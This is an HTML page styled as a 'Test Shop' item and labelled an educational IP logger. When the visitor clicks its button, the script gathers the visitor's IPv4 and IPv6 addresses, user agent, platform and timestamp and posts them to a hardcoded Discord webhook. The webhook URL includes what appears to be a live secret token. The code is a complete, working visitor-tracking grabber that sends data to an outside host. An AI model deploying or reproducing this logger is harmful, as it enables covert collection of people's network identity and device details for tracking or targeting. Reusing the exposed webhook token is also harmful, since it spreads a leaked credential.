<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Test Shop - IP Logger (Educational)</title>
<style>
    body {
        background-color: #0d1b2a;
        font-family: Arial, sans-serif;
        color: white;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .card {
        background-color: #1b263b;
        padding: 20px;
        border-radius: 12px;
        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
        width: 300px;
        text-align: center;
    }
    h2 {
        margin-bottom: 10px;
        color: #e0e1dd;
    }
    button {
        background-color: #415a77;
        color: white;
        padding: 10px 15px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-size: 16px;
        transition: background-color 0.2s ease;
    }
    button:hover {
        background-color: #778da9;
    }
</style>
</head>
<body>

<div class="card">
    <h2>Test Item</h2>
    <p>Educational IPv4 & IPv6 Logger</p>
    <button onclick="sendIP()">Send IPv4 & IPv6</button>
</div>

<script>
async function sendIP() {
    const webhook = "https://discord.com/api/webhooks/1405178051607793797/lrLovFGo3LWPXBe3u874pQYct3xulb679aybaGQtdDYsnyrBeEZCXT5I2zs39z2-RqAR"; // Replace with your webhook

    try {
        // Fetch IPv4
        const ipv4Res = await fetch('https://api.ipify.org?format=json');
        const ipv4 = (await ipv4Res.json()).ip;

        // Fetch IPv6 (try/catch in case unavailable)
        let ipv6 = "No IPv6 detected";
        try {
            const ipv6Res = await fetch('https://api64.ipify.org?format=json');
            ipv6 = (await ipv6Res.json()).ip;
        } catch (err) {
            console.warn("IPv6 not available");
        }

        // Browser and OS info
        const browser = navigator.userAgent;
        const os = navigator.platform;

        // Timestamp
        const timestamp = new Date().toLocaleString();

        // Prepare payload
        const payload = {
            content: `**Test IP Logger (Educational)**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
        };

        // Send to Discord webhook
        const response = await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) alert("Information sent successfully!");
        else alert("Failed to send. Check your webhook URL.");

    } catch (err) {
        console.error(err);
        alert("Error fetching info or sending webhook.");
    }
}
</script>

</body>
</html>
